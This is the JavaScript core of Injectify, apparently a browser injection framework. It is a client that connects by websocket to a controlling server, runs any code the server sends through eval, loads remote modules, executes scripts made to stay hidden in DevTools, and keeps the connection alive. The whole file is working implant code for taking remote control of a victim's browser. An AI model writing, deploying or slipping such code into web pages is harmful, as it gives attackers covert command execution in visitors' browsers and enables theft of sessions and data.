/**
 * Injectify core API
 * @class
 */
var injectify = window['injectify'] = /** @class */ (function () {
    function Injectify() {
    }
    /**
     * Listen for a topic from websocket connection
     * @param {string} topic Topic name to listen to
     * @param {function} callback Callback to be triggered once topic received
     */
    Injectify.listen = function (topic, callback) {
        var _this = this;
        ws.onmessage = function (message) {
            try {
                var data = JSON.parse(message.data);
                if (topic == data.t || topic == '*') {
                    callback(data.d, data.t);
                }
            }
            catch (e) {
                //throw e
                _this.send('e', e.stack);
            }
        };
    };
    /**
     * Send data to websocket
     * @param {string} topic Message topic
     * @param {Object} data Message data
     */
    Injectify.send = function (topic, data) {
        // If the websocket is dead, return
        if (ws.readyState == 0)
            return;
        try {
            ws.send(JSON.stringify({
                t: topic,
                d: data,
            }));
        }
        catch (e) {
            this.send('e', e.stack);
        }
    };
    /**
     * Log data to websocket connection (and locally)
     * @param {(Object|string)} message Data to be logged
     * @param {boolean} local Whether to log it in the local console
     */
    Injectify.log = function (message, local) {
        this.send('r', message);
        if (local)
            console.log(message);
    };
    /**
     * Get the websocket ping time (in milliseconds)
     * @param {function} callback Callback to be executed on ping complete
     */
    Injectify.ping = function (callback) {
        this.send('ping', +new Date());
        if (callback)
            this.listen('pong', callback);
    };
    /**
     * Safely execute a script with hidden context. Appears as 'VMXXX:1' in DevTools
     * @param {string} func the contents inside the <script> tag
     * @param {element} targetParent element to execute the script under, defaults to document.head
     */
    Injectify.exec = function (func, targetParent) {
        if (!targetParent)
            targetParent = document.head;
        var script = document.createElement('script');
        script.innerHTML = func;
        targetParent.appendChild(script);
        targetParent.removeChild(script);
    };
    /**
     * Loads a module from the injectify server
     * @param {string} name module name
     * @param {(string|Object)} params parameters to be sent to the module
     * @param {function} callback optional callback once the module has been loaded
     */
    Injectify.module = function (name, params, callback) {
        window["callbackFor" + name] = callback;
        this.send('module', {
            name: name,
            params: params
        });
    };
    Object.defineProperty(Injectify, "test", {
        /**
         * Check that the Injectify core is active
         */
        get: function () {
            return true;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(Injectify, "info", {
        /**
         * Returns information about Injectify
         */
        get: function () {
            var project = ws.url.split('?')[1], debug = false;
            if (project.charAt(0) == "$") {
                project = project.substring(1);
                debug = true;
            }
            return {
                project: atob(project),
                debug: debug,
                websocket: ws.url,
            };
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(Injectify, "debug", {
        /**
         * Returns whether injectify is in debug mode or not
         * true  - being used in development
         * false - console output should be suppressed
         */
        get: function () {
            return this.info.debug;
        },
        enumerable: true,
        configurable: true
    });
    return Injectify;
}());
if (injectify.debug)
    console.warn('⚡️ Injectify core.js loaded! --> https://github.com/samdenty99/injectify', injectify.info);
/**
 * Replace the basic websocket handler with a feature-rich one
 */
injectify.listen('*', function (data, topic) {
    try {
        if (topic == 'error') {
            console.error(data);
            return;
        }
        if (/^module:/.test(topic)) {
            var module = topic.substring(7), callback = window["callbackFor" + module];
            eval(data);
            if (data !== false && typeof callback == 'function') {
                callback();
            }
            delete window["callbackFor" + module];
            return;
        }
        eval(data);
    }
    catch (e) {
        //if (JSON.stringify(e) == "{}") e = e.stack
        injectify.send('e', e.stack);
    }
});
/**
 * Ping the server every 5 seconds to sustain the connection
 */
clearInterval(window['ping']);
window['ping'] = setInterval(function () {
    injectify.ping();
}, 5000);
